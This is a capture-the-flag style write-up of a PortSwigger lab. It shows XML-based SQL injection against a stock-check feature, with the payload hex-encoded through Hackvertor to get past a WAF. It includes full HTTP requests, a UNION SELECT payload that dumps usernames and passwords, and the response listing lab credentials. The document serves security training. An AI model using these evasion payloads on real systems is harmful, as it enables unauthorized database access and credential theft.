## Lab Description :

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/4185a547-fb59-4522-8043-a5954cf42cc4)


## Solution :

you can perform SQL injection attacks using any controllable input that is processed as a SQL query by the application. For example, some websites take input in **JSON or XML** format and use this to query the database.

These different formats may even provide alternative ways for you to obfuscate attacks that are otherwise blocked due to WAFs and other defense mechanisms. Weak implementations often just look for common SQL injection keywords within the request, so you may be able to bypass these filters by simply encoding or escaping characters in the prohibited keywords. For example, the following XML-based SQL injection uses an XML escape sequence to encode the S character in SELECT: 

```xml
<stockCheck>
    <productId>
        123
    </productId>
    <storeId>
        999 &#x53;ELECT * FROM information_schema.tables
    </storeId>
</stockCheck>
```

This will be decoded server-side before being passed to the SQL interpreter. 


----------------------------

### Identify the vulnerability -

There is a sql injection vulnerability in the `check stock` feature .

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/101e4bd9-2379-47c3-812c-ea601d8d222f)

**Request**

```http
POST /product/stock HTTP/1.1
Host: 0a1400c5031f6b1380380ee100b30043.web-security-academy.net
Cookie: session=36761REtmfgIxvy0ZIbkCEGBqqe9OGFG
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://0a1400c5031f6b1380380ee100b30043.web-security-academy.net/product?productId=12
Content-Type: application/xml
Content-Length: 108
Origin: https://0a1400c5031f6b1380380ee100b30043.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
 <stockCheck>
  <productId>12</productId>
  <storeId>1</storeId>
 </stockCheck>
```
**Response**

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/bb988b34-bbfc-40fc-b868-46b18cc2b6fb)


There are 2 xml tags where we can inject our sql injection payload ie `productID` & `StoreId`.

When testing sql injection query in `productID`,  we get a response like this

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/4e2496e2-3a72-4514-8288-acd314131b65)

When testing sql injection query in `storeID`,

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/2317ab5d-b0e9-421b-8599-5759f7f00990)

Both show the same **403 Forbidden error**

Why is is getting blocked?

```
A web application firewall (WAF) will block requests that contain obvious signs of a SQL injection attack. You'll need to find a way to obfuscate your malicious query to bypass this filter. We recommend using the Hackvertor extension to do this. 
```

So we need to bypas WAF and execute our sql payload.

### Bypass WAF - 

We need to Obfuscate out xml payload inorder to bypass WAF. As per lab description we'll use **Hackvector** for this

> Hackvertor is a **tag-based conversion tool** that supports various escapes and encodings including HTML5 entities, hex, octal, unicode, url encoding etc. 
> It uses **XML-like tags** to specify the type of encoding/conversion used.

NOw select the payload -> Right click -> Extensions -> Hackvector -> Encode -> Hex entities

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/4a369c2a-2994-4aca-bd0b-bccaf97d8fc2)

Now the request containing the highlighted payload is modified 

```http
POST /product/stock HTTP/2
Host: 0a1400c5031f6b1380380ee100b30043.web-security-academy.net
Cookie: session=36761REtmfgIxvy0ZIbkCEGBqqe9OGFG
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://0a1400c5031f6b1380380ee100b30043.web-security-academy.net/product?productId=12
Content-Type: application/xml
Content-Length: 127
Origin: https://0a1400c5031f6b1380380ee100b30043.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

<?xml version="1.0" encoding="UTF-8"?>
 <stockCheck>
  <productId>9 </productId>
  <storeId><@hex_entities>1 UNION SELECT null<@/hex_entities></storeId>
 </stockCheck>
```
**Response**

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/335a1b47-420a-4c6b-b7fc-88497b0035a5)

So we can now confirm that `storeID` parameter is indeed vulnerable & we bypassed the WAF by encoding our payload with hex entities.

> ProductID parameter doesn't seem to be vulnerable since it didn't return NULL value in response

### Craft payload -

Our payload to retrieve the admin user's credentials from users table,

```sql
UNION SELECT username || '~' || password FROM users
```

After encoding it with hex entities by using hackvertor,

**Response**

```
POST /product/stock HTTP/2
Host: 0a08008903b8f2558169219f00cf00ed.web-security-academy.net
Cookie: session=lr1cmtwOzGbHOxkXSLEUkZKKyVFIP2u4
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://0a08008903b8f2558169219f00cf00ed.web-security-academy.net/product?productId=9
Content-Type: application/xml
Content-Length: 176
Origin: https://0a08008903b8f2558169219f00cf00ed.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

<?xml version="1.0" encoding="UTF-8"?>
 <stockCheck>
  <productId>9 </productId>
  <storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users<@/hex_entities>
</storeId>
 </stockCheck>
 ```
 
 
**Response**

```html
HTTP/2 200 OK
Content-Type: text/plain; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 100

carlos~td28xlz7rzclt1lnzoq1
812 units
wiener~m0dg0ikxf86tq3lmqmit
administrator~wtw26hhafjjaybqu0z88
```
Now login as admin to solve the lab.

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/dd5dd87d-4741-4cde-87fc-95654e4d0ed0)



